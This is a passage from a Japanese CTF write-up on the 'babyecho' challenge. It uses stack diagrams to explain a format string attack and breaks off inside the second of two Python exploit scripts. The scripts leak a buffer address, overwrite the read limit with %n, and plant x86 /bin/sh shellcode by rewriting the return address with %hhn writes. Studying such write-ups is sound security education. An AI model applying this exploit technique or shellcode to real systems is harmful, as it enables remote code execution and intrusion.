<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,40)">サブルーチンのリターンアドレス</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,80)">&#8220;Reading %d bytes\n&#8221;で表示される数字</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,120)">定数(0x0a)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,160)">定数(null)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,200)">バッファーに読み込むバイト数</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,240)">バッファーの開始アドレス</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,280)">定数(null)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,340)">バッファー領域</text>
</svg></p>

<h2>攻撃手法：format string attack</h2>

<p>これらの調査をもとに、バッファーに読み込むバイト数が格納されているesp+0x10の値を、esp+0x14に格納されているesp+0x1cのアドレスをもとに書き換え、読み込むバイト数の上限を書き換えて、format string attackで攻撃コードを送り込む余地をつくる作戦が考えられます。
アプローチとしては以下の図のようになります。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<defs>
<marker id="arrowhead" refX="2" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<path d="M 0,0 V 10 L10,5 Z" fill="black"></path>
</marker>
</defs>
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="red" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000040d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_buf</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
</g>
<g class="arrow" transform="translate(260,240)">
<path stroke="#000000" fill="none" d="M0,0h40v60h-12" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<g class="arrow" transform="translate(280,190)">
<path stroke="#000000" fill="none" d="M0,110h95v-110h-87" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,40)">1. バッファーのアドレスを取得</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,80)">2. バイト数格納位置の1バイト上位へ移動</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,120)">3. その位置へ入力文字列長を格納</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(310,270)">%5$10p</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(380,240)">addr_buf - 0xb</text>
<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(290,205)">%7$ln</text>
</svg></p>

<p>13バイト制限のため、2回に分けてこの方法を試行します。
まず1回目に、<strong>%5$10p</strong>と入力することによって、esp+10に格納されているバッファーのアドレスを取得します。</p>

<p>そのアドレスから0x0bを引くことによって、バッファーの読み込みバイト数が格納されているアドレスの1バイト上位のアドレスを計算します。
これは、一度に送ることができる文字数が制限されていることによって、<strong>自由に大きな数値を指定できないため、</strong>バッファーのバイト数格納位置の1バイト上位に文字列長を書き込む方法をとったためです。今回の最大13バイトの入力という制限下では、最大でも9までしか数値を指定できません。それをそのままバッファー読み込みバイト数に格納しても、現状の13バイトより減ってしまいます。そのため、書き込む位置を上位にずらすことで、結果的にその数値をビットシフトによる掛け算で大きくし、バイト数制限の値を拡張しています。</p>

<p>そして2回目の入力時に、先ほど計算したアドレスへ文字数である4を、%nフォーマット文字列を使って書き込みます。これによって、現在0x0000000bとなっている読み込みバイト数を、0x0000040bに書き換えることができます。</p>

<p>コードは以下のようになります。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;localhost&#39;</span> <span class="c"># &#39;babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me&#39;</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">3232</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="mi">7</span> <span class="c"># index of read/write buffer</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%5$10p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># request buffer address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&quot;[DEBUG] Buffer address = 0x</span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">addr_buf</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">code</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0xb</span><span class="p">))</span> <span class="c"># address[buffer size limit] &lt;&lt; 8</span>
</span><span class='line'>    <span class="n">code</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">$ln</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">index</span> <span class="c"># write message text length = 4</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c"># overwrite buffer</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">exploit</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>実行してみると、以下のようになりました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Reading</span> <span class="mi">13</span> <span class="nb">bytes</span>
</span><span class='line'>
</span><span class='line'><span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Buffer</span> <span class="n">address</span> <span class="o">=</span> <span class="mh">0xffbf62bc</span>
</span><span class='line'>
</span><span class='line'><span class="n">Reading</span> <span class="mi">1023</span> <span class="nb">bytes</span>
</span></code></pre></td></tr></table></div></figure>


<p>1度にバッファーに読み込み可能な文字数の上限が変化しました。esp+0x10の値は、esp+0x11に4を書き込んだことから、0x0000040d、すなわち1037になるはずですが、ループを繰り返すたびに値のチェックがあり、1023を超える場合は1023に書き戻す処理があるので、上限が1023 bytesになりました。</p>

<p>これだけあれば、shellcodeを送り込んで実行させることができます。サブルーチンコールの呼び出し元であるリターンアドレスを書き換え、shellcodeを実行させてフラッグを獲得しに行きます。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<defs>
<marker id="arrowhead" refX="2" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<path d="M 0,0 V 10 L10,5 Z" fill="black"></path>
</marker>
<marker id="pointhead" refX="5" refY="5" markerWidth="10" markerHeight="10" orient="auto">
<circle cx="5" cy="5" r="5"/>
</marker>
</defs>
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x000003ff</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x000003ff</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_buf</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">addr_ret</tspan>
<tspan x="0" y="20" dy=".35em">&#8221;%??c$n%??c$n&#8221;</tspan>
<tspan x="0" y="40" dy=".35em">shellcode</tspan>
</text>
</g>
<g class="arrow" transform="translate(260,40)">
<path stroke="#000000" fill="none" d="M0,0h50v320h-42" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<g class="arrow" transform="translate(260,20)">
<path stroke="#000000" fill="none" d="M0,320h10v-20h-10h35v-300h-7" marker-end="url(#arrowhead)" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,80)">- addr_buf - 0x20でaddr_retを求める</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,120)">(addr_ret = リターンアドレスの格納場所)</text>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,160)">- バッファーにshellcodeを書く</text>
<g class="block" transform="translate(325,200)">
<path stroke="#000000" fill="none" d="M0,0h-30" marker-end="url(#pointhead)" stroke-width="1" />
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(5,0)">addr_retにaddr_shellを書き込む</text>
</g>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,240)">(addr_shell = shellcodeの開始アドレス)</text>
<g class="block" transform="translate(325,280)">
<path stroke="#000000" fill="none" d="M0,0h-15" marker-end="url(#pointhead)" stroke-width="1" />
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(5,0)">printfからaddr_retにあるアドレスに戻る</text>
</g>
<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(320,320)">- shellcodeが実行される</text>
</svg></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;localhost&#39;</span> <span class="c"># &#39;babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me&#39;</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">3232</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="mi">7</span> <span class="c"># index of read/write buffer</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%5$10p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># request buffer address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&quot;[DEBUG] Buffer address = 0x</span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">addr_buf</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">code</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0xb</span><span class="p">))</span> <span class="c"># address[buffer size limit] &lt;&lt; 8</span>
</span><span class='line'>    <span class="n">code</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">$ln</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">index</span> <span class="c"># write message text length = 4</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c"># overwrite buffer</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># x86 /bin/sh shellcode</span>
</span><span class='line'>    <span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addr_ret</span> <span class="o">=</span> <span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0x20</span>  <span class="c"># call return address = [esp]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="n">shellcode</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addr_shell</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span>  <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>  <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span> \
